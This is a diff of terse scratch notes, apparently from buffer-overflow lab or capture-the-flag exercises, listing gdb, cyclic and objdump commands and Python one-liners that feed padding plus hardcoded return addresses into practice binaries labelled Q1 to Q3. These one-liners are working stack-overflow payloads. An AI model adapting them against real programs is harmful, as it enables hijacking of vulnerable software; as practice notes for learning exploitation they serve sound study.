@@ -1,12 +1,29 @@
 gets();
 scanf("%63s", name);
 
+chmod +x
 
 gdb Xzone
 disass main
-b *fail+36
+b *fail+69
 r < a.txt
 info frame
 
+cyclic 10
+
+objdump -d Xzone.exe | grep target
+
+PYTHONIOENCODING=utf-8 python -c "print('B'*9 + 'b'*8 + '\x93\x15\x40')" | xxd
 PYTHONIOENCODING=utf-8 python -c "print('B'*9 + 'b'*8 + '\x93\x15\x40')" | ./Xzone
-objdump -d target
+
+Q1
+08049233
+python2 -c "print('A'*32 + 'B'*12 + '\x33\x92\x04\x08')" | ./basic
+
+Q2
+080491a2
+python2 -c "print('A'*64 + 'B'*12 + '\xa2\x91\x04\x08')" | ./whereami
+
+Q3
+080484e7
+python2 -c "print('A'*268 + '\xe7\x84\x04\x08')" | ./returnToSqrOne
